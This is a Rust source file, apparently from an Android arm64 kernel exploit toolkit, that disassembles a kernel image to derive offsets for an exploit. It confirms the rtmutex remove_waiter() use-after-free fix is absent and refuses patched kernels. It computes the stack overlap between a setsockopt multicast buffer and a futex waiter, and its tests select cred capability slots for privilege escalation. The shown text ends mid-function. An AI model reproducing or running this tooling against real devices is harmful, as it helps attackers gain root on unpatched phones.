//! Disassembly-driven derivation: pselect/futex waiter layout and the
//! nf_logger slide slot. Direct ports of the Python analysis.

use std::collections::{BTreeMap, BTreeSet};

use regex::Regex;

use crate::btf::Btf;
use crate::disasm::{
    add_sp_immediates, cmp_immediates, disassemble_range, first_sp_frame, has_direct_call,
    is_mov_w0_wzr, is_mov_x1, materialized_address, validate_frame_live_at,
};
use crate::error::{ExtractError, Result};
use crate::kallsyms::unique_or_err;

pub const PSELECT_ROUTE_NFDS: u64 = 320;
pub const OBJDUMP_CAP: usize = 0x2000;

pub type RelSymbols = BTreeMap<String, BTreeSet<u64>>;

/// Mnemonics whose first operand is read rather than written.
const READ_ONLY_FIRST_OPERAND: &[&str] = &[
    "cmp", "cmn", "tst", "ccmp", "ccmn", "cbz", "cbnz", "tbz", "tbnz", "str",
    "strb", "strh", "stp", "stnp", "stur", "sturb", "sturh",
];

/// Rebase kallsyms onto _text and return a sorted list of all offsets.
pub fn relative_symbols(
    symbols: &BTreeMap<String, BTreeSet<u64>>,
    base: u64,
) -> (RelSymbols, Vec<u64>) {
    let mut relative: RelSymbols = BTreeMap::new();
    let mut all_offsets: BTreeSet<u64> = BTreeSet::new();
    for (name, values) in symbols {
        let offsets: BTreeSet<u64> = values
            .iter()
            .filter(|value| **value >= base)
            .map(|value| *value - base)
            .collect();
        if !offsets.is_empty() {
            relative.insert(name.clone(), offsets.clone());
            all_offsets.extend(offsets);
        }
    }
    let sorted: Vec<u64> = all_offsets.into_iter().collect();
    (relative, sorted)
}

pub fn unique_offset(symbols: &RelSymbols, name: &str) -> Result<u64> {
    unique_or_err(symbols, name)
}

pub fn unique_offset_optional(symbols: &RelSymbols, name: &str) -> Option<u64> {
    unique_offset(symbols, name).ok()
}

/// SLUB stride of the mm_struct slab: `mm_cache_init` passes a size to
/// `kmem_cache_create_usercopy` under `SLAB_HWCACHE_ALIGN`, so the stride is
/// `ALIGN(size, 64)`. The BTF `sizeof` is not a substitute from 5.15 on,
/// where the argument adds `cpumask_size()`.
pub fn derive_mm_stride(
    kernel: &[u8],
    symbols: &RelSymbols,
    sorted_offsets: &[u64],
) -> Option<u32> {
    let lines = match disassemble_symbol(
        kernel,
        symbols,
        sorted_offsets,
        "mm_cache_init",
        OBJDUMP_CAP,
    ) {
        Ok(lines) => lines,
        Err(err) => {
            eprintln!("warning: mm_cache_init not disassembled ({err}); no stride measured");
            return None;
        }
    };
    let Some(allocation) = unique_offset_optional(symbols, "kmem_cache_create_usercopy") else {
        eprintln!(
            "warning: kmem_cache_create_usercopy is not in kallsyms; no stride measured"
        );
        return None;
    };
    let Some(size) = mm_cache_size_arg(&lines, allocation) else {
        eprintln!(
            "warning: mm_cache_init has no literal kmem_cache_create_usercopy size; \
             no stride measured"
        );
        return None;
    };
    let stride = size.checked_add(63).map(|value| value & !63)?;
    eprintln!("info: mm_struct cache size=0x{size:x} from mm_cache_init, stride=0x{stride:x}");
    Some(stride)
}

/// The size argument `mm_cache_init` passes to `kmem_cache_create_usercopy`:
/// the last `mov`/`movz`/`movk`/`add` that writes the `w1`/`x1` alias before
/// the call to `allocation`. Any other write to the alias, or an intervening
/// call, clears the value.
pub fn mm_cache_size_arg(lines: &[String], allocation: u64) -> Option<u32> {
    let mov = Regex::new(r"(?i)\bmov\s+[wx]1,\s*#0x([0-9a-f]+)").unwrap();
    let movz = Regex::new(r"(?i)\bmovz\s+[wx]1,\s*#0x([0-9a-f]+)(?:,\s*lsl\s*#(\d+))?").unwrap();
    let movk = Regex::new(r"(?i)\bmovk\s+[wx]1,\s*#0x([0-9a-f]+)(?:,\s*lsl\s*#(\d+))?").unwrap();
    let add = Regex::new(
        r"(?i)\badd\s+[wx]1,\s*[wx]1,\s*#0x([0-9a-f]+)(?:,\s*lsl\s*#(\d+))?",
    )
    .unwrap();
    let first_operand =
        Regex::new(r"(?i)(?:^|:\s*)([a-z][a-z0-9.]*)\s+[wx]1\s*,").unwrap();
    let ldp_second =
        Regex::new(r"(?i)(?:^|:\s*)(?:ldp|ldnp|ldpsw)\s+[wx]\d+,\s*[wx]1\s*,").unwrap();
    let call_any = Regex::new(r"(?i)\b(?:bl\s+0x[0-9a-f]+|blr\s+[wx]\d+)").unwrap();
    let call = Regex::new(&format!(r"(?i)\bbl\s+0x{allocation:x}\b")).unwrap();
    for (i, line) in lines.iter().enumerate() {
        if !call.is_match(line) {
            continue;
        }
        let mut size: Option<u32> = None;
        let mut unresolved = false;
        for candidate in &lines[i.saturating_sub(12)..i] {
            if let Some(caps) = mov.captures(candidate) {
                size = u32::from_str_radix(&caps[1], 16).ok();
                unresolved = size.is_none();
            } else if let Some(caps) = movz.captures(candidate) {
                size = u32::from_str_radix(&caps[1], 16)
                    .ok()
                    .and_then(|imm| imm.checked_shl(shift_of(&caps)));
                unresolved = size.is_none();
            } else if let Some(caps) = movk.captures(candidate) {
                let shift = shift_of(&caps);
                size = u32::from_str_radix(&caps[1], 16)
                    .ok()
                    .zip(size)
                    .and_then(|(imm, current)| {
                        let lane = 0xffffu32.checked_shl(shift)?;
                        Some((current & !lane) | ((imm & 0xffff) << shift))
                    });
                unresolved = size.is_none();
            } else if let Some(caps) = add.captures(candidate) {
                let shift = shift_of(&caps);
                size = u32::from_str_radix(&caps[1], 16)
                    .ok()
                    .and_then(|imm| imm.checked_shl(shift))
                    .and_then(|delta| size.and_then(|value| value.checked_add(delta)));
                unresolved = size.is_none();
            } else if let Some(caps) = first_operand.captures(candidate) {
                if !READ_ONLY_FIRST_OPERAND.contains(&caps[1].to_ascii_lowercase().as_str()) {
                    size = None;
                    unresolved = true;
                }
            } else if ldp_second.is_match(candidate) || call_any.is_match(candidate) {
                size = None;
                unresolved = true;
            }
        }
        if unresolved {
            return None;
        }
        if size.is_some() {
            return size;
        }
    }
    None
}

fn shift_of(caps: &regex::Captures) -> u32 {
    caps.get(2)
        .and_then(|m| m.as_str().parse::<u32>().ok())
        .unwrap_or(0)
}

fn disassemble_symbol(
    kernel: &[u8],
    symbols: &RelSymbols,
    sorted_offsets: &[u64],
    name: &str,
    cap: usize,
) -> Result<Vec<String>> {
    let start = unique_offset(symbols, name)? as usize;
    let higher = sorted_offsets.iter().find(|off| **off as usize > start);
    let stop = (start + cap).min(higher.map_or(start + cap, |off| *off as usize));
    disassemble_range(kernel, start, stop)
}

/// reject kernels that include the rtmutex
/// remove_waiter() fix before offset extraction.
pub fn ensure_rtmutex_43499_unpatched(
    kernel: &[u8],
    symbols: &RelSymbols,
    sorted_offsets: &[u64],
) -> Result<u64> {
    let start = unique_offset_optional(symbols, "remove_waiter")
        .ok_or_else(|| ExtractError::new("cannot check: remove_waiter is not in kallsyms"))?;
    let cap = OBJDUMP_CAP as u64;
    let stop = (start + cap).min(
        sorted_offsets
            .iter()
            .find(|off| **off > start)
            .map_or(start + cap, |off| *off),
    );
    let dis = disassemble_range(kernel, start as usize, stop as usize)?;
    if remove_waiter_uses_current(&dis) {
        return Ok(start);
    }
    Err(ExtractError::already_fixed(format!(
        "remove_waiter()@{start:#x} never reads current (no mrs sp_el0); \
         rtmutex UAF fix is present"
    )))
}

/// True when `remove_waiter()` still operates on `current` (vulnerable):
/// the fixed variant no longer contains `mrs xN, sp_el0`.
pub fn remove_waiter_uses_current(dis: &[String]) -> bool {
    let mrs_current = Regex::new(r"(?i)\bmrs\s+x\d+,\s*s3_0_c4_c1_0\b").unwrap();
    dis.iter().any(|line| mrs_current.is_match(line))
}

/// Some Android kernels inline `tcp_zerocopy_receive()` into the TCP option
/// handler, so its symbol disappears while the `TCP_ZEROCOPY_RECEIVE` path
/// stays. `tcp_zerocopy_vm_insert_batch` is only reachable from
/// `tcp_zerocopy_receive`, so a direct call to it from the option handler
/// proves the inlined path is present.
pub fn tcp_zerocopy_receive_inlined(
    kernel: &[u8],
    symbols: &RelSymbols,
    sorted_offsets: &[u64],
) -> bool {
    let Some(batch) = unique_offset_optional(symbols, "tcp_zerocopy_vm_insert_batch") else {
        return false;
    };
    for handler in ["do_tcp_getsockopt", "do_tcp_setsockopt"] {
        let Ok(dis) = disassemble_symbol(kernel, symbols, sorted_offsets, handler, OBJDUMP_CAP)
        else {
            continue;
        };
        if has_direct_call(&dis, batch) {
            return true;
        }
    }
    false
}

/// One-shot multicast stack geometry derived from the target kernel image
/// (no device, no root). Depths are measured from the syscall stack top.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct McastWaiterGeometry {
    pub waiter_off: u64,
    pub setsockopt_depth: u64,
    pub waiter_depth: u64,
}

const SETSOCKOPT_CHAIN: &[&str] = &[
    "__arm64_sys_setsockopt",
    "__sys_setsockopt",
    "sock_common_setsockopt",
    "udp_setsockopt",
    "ip_setsockopt",
];
const FUTEX_CHAIN: &[&str] = &["__arm64_sys_futex", "do_futex", "futex_wait_requeue_pi"];

fn sum_chain_frames(
    kernel: &[u8],
    symbols: &RelSymbols,
    sorted: &[u64],
    names: &[&str],
) -> Result<u64> {
    let mut total = 0u64;
    for name in names {
        let dis = disassemble_symbol(kernel, symbols, sorted, name, OBJDUMP_CAP)?;
        total = total
            .checked_add(first_sp_frame(&dis, name)?)
            .ok_or_else(|| ExtractError::new("multicast frame depth overflow"))?;
    }
    Ok(total)
}

/// The `add xN, sp, #off` feeding the `mov w2, #buffer_size` copy in
/// `ip_setsockopt`: the multicast stamp window offset.
fn greqs_offset_from_dis(lines: &[String], buffer_size: u64) -> Option<u64> {
    let mov = Regex::new(&format!(r"(?i)\bmov\s+w2,\s*#0x{buffer_size:x}\b")).unwrap();
    let add = Regex::new(r"(?i)\badd\s+x\d+,\s*sp,\s*#0x([0-9a-f]+)").unwrap();
    for (i, line) in lines.iter().enumerate() {
        if !mov.is_match(line) {
            continue;
        }
        let lo = i.saturating_sub(8);
        for prev in lines[lo..i].iter().rev() {
            if let Some(caps) = add.captures(prev) {
                return u64::from_str_radix(&caps[1], 16).ok();
            }
        }
    }
    None
}

/// The `add x27, sp, #off` waiter local in `futex_wait_requeue_pi`, proven by
/// the `add xN, x27, #<pi_tree_entry>` that indexes it.
fn waiter_local_from_dis(lines: &[String], pi_tree_entry: u64) -> Option<u64> {
    let set = Regex::new(r"(?i)\badd\s+x27,\s*sp,\s*#0x([0-9a-f]+)").unwrap();
    let idx = Regex::new(&format!(
        r"(?i)\badd\s+x\d+,\s*x27,\s*#0x{pi_tree_entry:x}\b"
    ))
    .unwrap();
    for (i, line) in lines.iter().enumerate() {
        if let Some(caps) = set.captures(line) {
            let hi = (i + 8).min(lines.len());
            if lines[i + 1..hi].iter().any(|l| idx.is_match(l)) {
                return u64::from_str_radix(&caps[1], 16).ok();
            }
        }
    }
    None
}

/// Static one-shot multicast `waiter_off` for the target image:
/// `(Σ setsockopt_frames − greqs_off) − (Σ futex_frames − waiter_local_off)`.
/// Validated to reproduce the A301SO hardware value (`0x60`).
pub fn multicast_waiter_off(
    kernel: &[u8],
    symbols: &RelSymbols,
    sorted: &[u64],
    buffer_size: u64,
    pi_tree_entry: u64,
) -> Result<McastWaiterGeometry> {
    let setsockopt_frames = sum_chain_frames(kernel, symbols, sorted, SETSOCKOPT_CHAIN)?;
    let futex_frames = sum_chain_frames(kernel, symbols, sorted, FUTEX_CHAIN)?;
    let ip = disassemble_symbol(kernel, symbols, sorted, "ip_setsockopt", OBJDUMP_CAP)?;
    let greqs = greqs_offset_from_dis(&ip, buffer_size)
        .ok_or_else(|| ExtractError::new("ip_setsockopt multicast copy window not found"))?;
    let fw = disassemble_symbol(
        kernel,
        symbols,
        sorted,
        "futex_wait_requeue_pi",
        OBJDUMP_CAP,
    )?;
    let waiter_local = waiter_local_from_dis(&fw, pi_tree_entry)
        .ok_or_else(|| ExtractError::new("futex_wait_requeue_pi waiter local not found"))?;
    let setsockopt_depth = setsockopt_frames
        .checked_sub(greqs)
        .ok_or_else(|| ExtractError::new("greqs offset exceeds setsockopt frames"))?;
    let waiter_depth = futex_frames
        .checked_sub(waiter_local)
        .ok_or_else(|| ExtractError::new("waiter local exceeds futex frames"))?;
    let waiter_off = setsockopt_depth
        .checked_sub(waiter_depth)
        .ok_or_else(|| ExtractError::new("no multicast overlap in stack geometry"))?;
    Ok(McastWaiterGeometry {
        waiter_off,
        setsockopt_depth,
        waiter_depth,
    })
}

#[cfg(test)]
mod tests {
    use super::{
        mm_cache_size_arg, multicast_geometry_5x, multicast_geometry_btf_only,
        remove_waiter_uses_current, select_cred_caps, select_cred_refs,
        waiter_locals_from_init_call,
    };
    use std::collections::{BTreeMap, BTreeSet};

    #[test]
    fn mm_cache_size_comes_from_the_argument_fed_to_the_call() {
        let lines = vec![
            "0000: stp x29, x30, [sp, #-0x20]!".to_string(),
            "0004: mov w1, #0x3c0".to_string(),
            "0008: mov x0, x20".to_string(),
            "000c: bl 0x1234".to_string(),
        ];
        assert_eq!(mm_cache_size_arg(&lines, 0x1234), Some(0x3c0));
    }

    #[test]
    fn mm_cache_size_assembles_a_movz_movk_pair() {
        let lines = vec![
            "0000: movz w1, #0x500".to_string(),
            "0004: movk w1, #0x1, lsl #16".to_string(),
            "0008: bl 0x1234".to_string(),
        ];
        assert_eq!(mm_cache_size_arg(&lines, 0x1234), Some(0x10000 | 0x500));
    }

    #[test]
    fn mm_cache_size_tracks_an_adjustment_after_the_move() {
        let lines = vec![
            "0000: mov w1, #0x3c0".to_string(),
            "0004: add w1, w1, #0x8".to_string(),
            "0008: bl 0x1234".to_string(),
        ];
        assert_eq!(mm_cache_size_arg(&lines, 0x1234), Some(0x3c8));
    }

    #[test]
    fn mm_cache_size_accepts_an_x1_adjustment() {
        let lines = vec![
            "0000: mov w1, #0x3c0".to_string(),
            "0004: add x1, x1, #0x8".to_string(),
            "0008: bl 0x1234".to_string(),
        ];
        assert_eq!(mm_cache_size_arg(&lines, 0x1234), Some(0x3c8));
    }

    #[test]
    fn mm_cache_size_uses_the_last_write() {
        let lines = vec![
            "0000: mov w1, #0x3c0".to_string(),
            "0004: mov w1, #0x400".to_string(),
            "0008: bl 0x1234".to_string(),
        ];
        assert_eq!(mm_cache_size_arg(&lines, 0x1234), Some(0x400));
    }

    #[test]
    fn mm_cache_size_replaces_the_movk_lane() {
        let lines = vec![
            "0000: mov w1, #0x3c0".to_string(),
            "0004: movk w1, #0x400".to_string(),
            "0008: bl 0x1234".to_string(),
        ];
        assert_eq!(mm_cache_size_arg(&lines, 0x1234), Some(0x400));
    }

    #[test]
    fn mm_cache_size_ignores_an_unrelated_call() {
        let lines = vec![
            "0000: mov w1, #0x400".to_string(),
            "0004: bl 0x1111".to_string(),
            "0008: mov w1, #0x3c0".to_string(),
            "000c: bl 0x1234".to_string(),
        ];
        assert_eq!(mm_cache_size_arg(&lines, 0x1234), Some(0x3c0));
    }

    #[test]
    fn mm_cache_size_refuses_an_unresolved_write() {
        let lines = vec![
            "0000: mov w1, #0x3c0".to_string(),
            "0004: ldr w1, [sp, #0x8]".to_string(),
            "0008: bl 0x1234".to_string(),
        ];
        assert_eq!(mm_cache_size_arg(&lines, 0x1234), None);
    }

    #[test]
    fn mm_cache_size_refuses_an_x1_write() {
        let lines = vec![
            "0000: mov w1, #0x3c0".to_string(),
            "0004: ldr x1, [sp, #0x8]".to_string(),
            "0008: bl 0x1234".to_string(),
        ];
        assert_eq!(mm_cache_size_arg(&lines, 0x1234), None);
    }

    #[test]
    fn mm_cache_size_refuses_an_ldp_second_destination() {
        let lines = vec![
            "0000: mov w1, #0x3c0".to_string(),
            "0004: ldp x0, x1, [sp, #0x10]".to_string(),
            "0008: bl 0x1234".to_string(),
        ];
        assert_eq!(mm_cache_size_arg(&lines, 0x1234), None);
    }

    #[test]
    fn mm_cache_size_refuses_an_ldpsw_second_destination() {
        let lines = vec![
            "0000: mov w1, #0x3c0".to_string(),
            "0004: ldpsw x2, x1, [sp, #0x10]".to_string(),
            "0008: bl 0x1234".to_string(),
        ];
        assert_eq!(mm_cache_size_arg(&lines, 0x1234), None);
    }

    #[test]
    fn mm_cache_size_refuses_an_intervening_call() {
        let lines = vec![
            "0000: mov w1, #0x3c0".to_string(),
            "0004: bl 0x1111".to_string(),
            "0008: bl 0x1234".to_string(),
        ];
        assert_eq!(mm_cache_size_arg(&lines, 0x1234), None);
    }

    #[test]
    fn mm_cache_size_refuses_an_ldrb_write() {
        let lines = vec![
            "0000: mov w1, #0x3c0".to_string(),
            "0004: ldrb w1, [x0]".to_string(),
            "0008: bl 0x1234".to_string(),
        ];
        assert_eq!(mm_cache_size_arg(&lines, 0x1234), None);
    }

    #[test]
    fn mm_cache_size_refuses_a_csel_write() {
        let lines = vec![
            "0000: mov w1, #0x3c0".to_string(),
            "0004: csel w1, w2, w3, eq".to_string(),
            "0008: bl 0x1234".to_string(),
        ];
        assert_eq!(mm_cache_size_arg(&lines, 0x1234), None);
    }

    #[test]
    fn cred_caps_selects_the_contiguous_non_zero_run() {
        let slots: &[(u32, u64)] = &[
            (0x28, 0),
            (0x30, 0x1ffffffffff),
            (0x38, 0x1ffffffffff),
            (0x40, 0x1ffffffffff),
            (0x48, 0),
        ];
        let read = |offset: u32| slots.iter().find(|(o, _)| *o == offset).map(|(_, v)| *v);
        assert_eq!(
            select_cred_caps(read, 0x28, 0x50),
            Some((0x30, 3, 0x1ffffffffff))
        );
    }

    #[test]
    fn cred_caps_rejects_an_all_zero_range() {
        assert_eq!(select_cred_caps(|_| Some(0u64), 0x28, 0x50), None);
    }

    #[test]
    fn cred_refs_keep_only_non_zero_kernel_vas_in_offset_order() {
        let slots = [
            (0x78, 0),
            (0x80, 0xffffffc00ab23a80),
            (0x88, 0x0000000000000004),
            (0x58, 0),
            (0x98, 0xffffffc00ab23b28),
            (0x90, 0xffffffc00ab23ff0),
        ];
        assert_eq!(
            select_cred_refs(&slots),
            vec![
                (0x80, 0xffffffc00ab23a80),
                (0x90, 0xffffffc00ab23ff0),
                (0x98, 0xffffffc00ab23b28),
            ]
        );
    }

    #[test]
    fn cred_without_btf_reads_the_five_ten_layout() {
        let mut bytes = vec![0u8; super::CRED_5X_SIZE as usize];
        for offset in [48u32, 56, 64] {
            bytes[offset as usize..offset as usize + 8]
                .copy_from_slice(&0x1ffffffffffu64.to_le_bytes());
        }
        for (offset, value) in [
            (0x80u32, 0xffffffc00a79f660u64),
            (0x88, 0xffffffc00a79f6f8),
            (0x90, 0xffffffc00a7a0b88),
        ] {
            bytes[offset as usize..offset as usize + 8]
                .copy_from_slice(&value.to_le_bytes());
        }

        let cred = super::derive_cred_5x_without_btf(&bytes, 0, super::CRED_5X_SIZE)
            .expect("cred layout is complete");
        assert_eq!(cred.caps_offset, 48);
        assert_eq!(cred.caps_count, 3);
        assert_eq!(cred.caps_value, 0x1ffffffffff);
        assert_eq!(
            cred.refs,
            vec![
                (0x80, 0xffffffc00a79f660),
                (0x88, 0xffffffc00a79f6f8),
                (0x90, 0xffffffc00a7a0b88),
            ]
        );
    }

    #[test]
    fn multicast_geometry_uses_btf_offsets_and_the_proven_constants() {
        let mut structs: BTreeMap<String, Option<u32>> = BTreeMap::new();
        structs.insert("waiter_task".to_string(), Some(48));
        structs.insert("waiter_lock".to_string(), Some(56));
        let geometry = multicast_geometry_5x(&structs);
        assert_eq!(geometry.first(), Some(&("waiter_off", 96)));
        assert!(geometry.contains(&("task_offset", 48)));
        assert!(geometry.contains(&("lock_offset", 56)));
        assert!(
            !geometry
                .iter()
                .any(|(key, _)| key.starts_with("fake_") || key.starts_with("lock_slot"))
        );
        assert!(geometry.contains(&("compact_waiter", 1)));

        let without: BTreeMap<String, Option<u32>> = BTreeMap::new();
        let geometry = multicast_geometry_5x(&without);
        assert!(!geometry.iter().any(|(key, _)| *key == "task_offset"));
        assert!(!geometry.iter().any(|(key, _)| *key == "lock_offset"));
    }

    #[test]
    fn unverified_multicast_geometry_keeps_only_btf_offsets() {
        let mut structs: BTreeMap<String, Option<u32>> = BTreeMap::new();
        structs.insert("waiter_task".to_string(), Some(48));
        structs.insert("waiter_lock".to_string(), Some(56));
        assert_eq!(
            multicast_geometry_btf_only(&structs),
            vec![("task_offset", 48), ("lock_offset", 56)]
        );
        let without: BTreeMap<String, Option<u32>> = BTreeMap::new();
        assert!(multicast_geometry_btf_only(&without).is_empty());
    }

    #[test]
    fn patched_remove_waiter_never_reads_current() {
        let dis = vec![
            "0106f91c: ldr x20, [x23, #0x50]".to_string(),
            "0106f964: str xzr, [x20, #0x938]".to_string(),
            "0106fae8: mov x5, x20".to_string(),
        ];
        assert!(!remove_waiter_uses_current(&dis));
    }

    #[test]
    fn vulnerable_remove_waiter_reads_current() {
        let dis = vec![
            "01068de0: mrs x20, s3_0_c4_c1_0".to_string(),
            "01068e2c: mov x0, x21".to_string(),
            "01068e30: str xzr, [x20, #0x938]".to_string(),
        ];
        assert!(remove_waiter_uses_current(&dis));
    }

    #[test]
    fn multicast_stamp_and_waiter_locals_are_read_from_disassembly() {
        let ip: Vec<String> = vec![
            "00f4: add x0, sp, #0x18".to_string(),
            "0100: add x24, sp, #0x18".to_string(),
            "01cc: add x0, sp, #0x18".to_string(),
            "01d4: mov w2, #0x108".to_string(),
        ];
        assert_eq!(super::greqs_offset_from_dis(&ip, 0x108), Some(0x18));

        let fw: Vec<String> = vec![
            "011c: add x27, sp, #0x98".to_string(),
            "0124: add x9, x27, #0x18".to_string(),
        ];
        assert_eq!(super::waiter_local_from_dis(&fw, 0x18), Some(0x98));
    }

    #[test]
    fn multicast_waiter_off_matches_the_validated_images() {
        // Depths from the validated images; the arithmetic must reproduce the
        // hardware-observed one-shot waiter_off.
        let off = |setsockopt_frames: u64, greqs: u64, futex_frames: u64, wlocal: u64| {
            (setsockopt_frames - greqs) - (futex_frames - wlocal)
        };
        // A301SO 5.15.189 (hardware-probed = 0x60).
        assert_eq!(off(0x370, 0x18, 0x390, 0x98), 0x60);
        // PD2361 5.15.178 (static candidate = 0x50).
        assert_eq!(off(0x370, 0x18, 0x330, 0x28), 0x50);
    }

    #[test]
    fn partial_waiter_fields_fall_back_to_zero() {
        assert_eq!(super::waiter_layout_fields(Some(0x28), None), (0, 0));
        assert_eq!(super::waiter_layout_fields(None, Some(0x60)), (0, 0));
        assert_eq!(super::waiter_layout_fields(None, None), (0, 0));
        assert_eq!(
            super::waiter_layout_fields(Some(0x28), Some(0x60)),
            (0x28, 0x60)
        );
    }

    fn init_symbols(addr: u64) -> super::RelSymbols {
        let mut symbols = super::RelSymbols::new();
        symbols.insert("rt_mutex_init_waiter".to_string(), BTreeSet::from([addr]));
        symbols
    }

    #[test]
    fn waiter_seed_accepts_a_direct_sp_offset() {
        let lines = vec![
            "0000: add x0, sp, #0x80".to_string(),
            "0004: bl 0x1234".to_string(),
        ];
        assert_eq!(
            waiter_locals_from_init_call(&lines, &init_symbols(0x1234)),
            BTreeSet::from([0x80])
        );
    }

    #[test]
    fn waiter_seed_rejects_an_overwritten_x0() {
        let lines = vec![
            "0000: sub sp, sp, #0x100".to_string(),
            "0004: add x19, sp, #0x80".to_string(),
            "0008: add x0, sp, #0x20".to_string(),
            "000c: str xzr, [sp, #0x20]".to_string(),
            "0010: mov x0, x19".to_string(),
            "0014: bl 0x1234".to_string(),
        ];
        assert!(waiter_locals_from_init_call(&lines, &init_symbols(0x1234)).is_empty());
    }

    #[test]
    fn waiter_seed_rejects_an_intervening_call() {
        let lines = vec![
            "0000: add x0, sp, #0x80".to_string(),
            "0004: bl 0x1111".to_string(),
            "0008: bl 0x1234".to_string(),
        ];
        assert!(waiter_locals_from_init_call(&lines, &init_symbols(0x1234)).is_empty());
    }

    #[test]
    fn waiter_seed_rejects_an_ldpsw_x0_destination() {
        let lines = vec![
            "0000: add x0, sp, #0x80".to_string(),
            "0004: ldpsw x2, x0, [sp, #0x10]".to_string(),
            "0008: bl 0x1234".to_string(),
        ];
        assert!(waiter_locals_from_init_call(&lines, &init_symbols(0x1234)).is_empty());
    }
}

/// Waiter sp locals from the `add x0, sp, #imm` that is the last write to `x0`
/// before `bl rt_mutex_init_waiter`. An inlined init has no symbol, so the
/// caller falls back to the zero sweep.
fn waiter_locals_from_init_call(lines: &[String], symbols: &RelSymbols) -> BTreeSet<u64> {
    let mut locals = BTreeSet::new();
    let Some(init_addr) = unique_offset_optional(symbols, "rt_mutex_init_waiter") else {
        return locals;
    };
    let call_re = Regex::new(&format!(r"(?i)\bbl\s+0x{init_addr:x}\b")).unwrap();
    let add_re = Regex::new(r"(?i)\badd\s+x0,\s*sp,\s*#0x([0-9a-f]+)\b").unwrap();
    let first_operand =
        Regex::new(r"(?i)(?:^|:\s*)([a-z][a-z0-9.]*)\s+[wx]0\s*,").unwrap();
    let ldp_second =
        Regex::new(r"(?i)(?:^|:\s*)(?:ldp|ldnp|ldpsw)\s+[wx]\d+,\s*[wx]0\s*,").unwrap();
    let call_any = Regex::new(r"(?i)\b(?:bl\s+0x[0-9a-f]+|blr\s+[wx]\d+)").unwrap();
    for (i, line) in lines.iter().enumerate() {
        if !call_re.is_match(line) {
            continue;
        }
        for back in (i.saturating_sub(12)..i).rev() {
            let candidate = &lines[back];
            if let Some(caps) = add_re.captures(candidate) {
                if let Ok(value) = u64::from_str_radix(&caps[1], 16) {
                    locals.insert(value);
                }
                break;
            }
            if call_any.is_match(candidate) || ldp_second.is_match(candidate) {
                break;
            }
            if let Some(caps) = first_operand.captures(candidate) {
                if !READ_ONLY_FIRST_OPERAND.contains(&caps[1].to_ascii_lowercase().as_str()) {
                    break;
                }
            }
        }
    }
    locals
}

/// A partial BTF can expose one waiter field. A flat 5.10 waiter has no
/// `wake_state`, so an incomplete pair takes the no-BTF init-call seed.
fn waiter_layout_fields(pi_tree: Option<u32>, wake_state: Option<u32>) -> (u64, u64) {
    match (pi_tree, wake_state) {
        (Some(pi_tree), Some(wake_state)) => (pi_tree as u64, wake_state as u64),
        _ => (0, 0),
    }
}

pub struct PselectLayout {
    pub shift: u64,
    pub waiter_local: u64,
    pub pselect_word0: i64,
    pub futex_waiter: i64,
    pub pselect_buffer: u64,
    pub chain: String,
    pub futex_chain: String,
    pub frames: BTreeMap<String, u64>,
}

pub fn derive_pselect_layout(
    kernel: &[u8],
    symbols: &RelSymbols,
    sorted_offsets: &[u64],
    btf: Option<&Btf>,
    route_nfds: u64,
) -> Result<PselectLayout> {
    let mut names: Vec<(&str, &str)> = vec![
        ("pselect_wrapper", "__arm64_sys_pselect6"),
        ("pselect_core", "core_sys_select"),
        ("futex_wrapper", "__arm64_sys_futex"),
        ("futex_dispatch", "do_futex"),
        ("futex_wait", "futex_wait_requeue_pi"),
    ];
    if unique_offset_optional(symbols, "do_pselect").is_some() {
        names.push(("pselect_dispatch", "do_pselect"));
    }

    let mut dis: BTreeMap<&str, Vec<String>> = BTreeMap::new();
    for (key, name) in &names {
        dis.insert(
            key,
            disassemble_symbol(kernel, symbols, sorted_offsets, name, OBJDUMP_CAP)?,
        );
    }

    let mut pselect_chain = vec!["pselect_wrapper"];
    let pselect_core_addr = unique_offset(symbols, "core_sys_select")?;
    if has_direct_call(&dis["pselect_wrapper"], pselect_core_addr) {
        // inline path
    } else if names.iter().any(|(k, _)| *k == "pselect_dispatch") {
        let dispatch_addr = unique_offset(symbols, "do_pselect")?;
        if !has_direct_call(&dis["pselect_wrapper"], dispatch_addr) {
            return Err(ExtractError::new(
                "__arm64_sys_pselect6 calls neither core_sys_select nor do_pselect",
            ));
        }
        if !has_direct_call(&dis["pselect_dispatch"], pselect_core_addr) {
            return Err(ExtractError::new(
                "do_pselect does not directly call core_sys_select",
            ));
        }
        pselect_chain.push("pselect_dispatch");
    } else {
        return Err(ExtractError::new(
            "__arm64_sys_pselect6 calls neither core_sys_select nor do_pselect",
        ));
    }
    pselect_chain.push("pselect_core");

    let mut futex_chain = vec!["futex_wrapper"];
    let futex_wait_addr = unique_offset(symbols, "futex_wait_requeue_pi")?;
    if has_direct_call(&dis["futex_wrapper"], futex_wait_addr) {
        // direct path
    } else if has_direct_call(&dis["futex_wrapper"], unique_offset(symbols, "do_futex")?) {
        if !has_direct_call(&dis["futex_dispatch"], futex_wait_addr) {
            return Err(ExtractError::new(
                "do_futex does not directly call futex_wait_requeue_pi",
            ));
        }
        futex_chain.push("futex_dispatch");
    } else {
        return Err(ExtractError::new(
            "__arm64_sys_futex calls neither do_futex nor futex_wait_requeue_pi",
        ));
    }
    futex_chain.push("futex_wait");

    for (caller, callee) in pselect_chain.iter().zip(pselect_chain.iter().skip(1)) {
        let target = unique_offset(symbols, names.iter().find(|(k, _)| k == callee).unwrap().1)?;
        let anchor = Regex::new(&format!(r"(?i)\bbl\s+0x{target:x}\b")).unwrap();
        validate_frame_live_at(
            &dis[caller],
            &anchor,
            names.iter().find(|(k, _)| k == caller).unwrap().1,
        )?;
    }
    for (caller, callee) in futex_chain.iter().zip(futex_chain.iter().skip(1)) {
        let target = unique_offset(symbols, names.iter().find(|(k, _)| k == callee).unwrap().1)?;
        let anchor = Regex::new(&format!(r"(?i)\bbl\s+0x{target:x}\b")).unwrap();
        validate_frame_live_at(
            &dis[caller],
            &anchor,
            names.iter().find(|(k, _)| k == caller).unwrap().1,
        )?;
    }

    let mut frames: BTreeMap<String, u64> = BTreeMap::new();
    for (key, text) in &dis {
        let full_name = names.iter().find(|(k, _)| k == key).unwrap().1;
        frames.insert(format!("frame_{key}"), first_sp_frame(text, full_name)?);
    }

    // 6.6 names the rb_nodes tree/pi_tree; 6.1 calls them
    // tree_entry/pi_tree_entry (same offsets in the struct). Without BTF the
    // waiter is seeded from the rt_mutex_init_waiter call instead.
    let pi_tree = btf
        .and_then(|btf| btf.field("rt_mutex_waiter", "pi_tree"))
        .or_else(|| btf.and_then(|btf| btf.field("rt_mutex_waiter", "pi_tree_entry")));
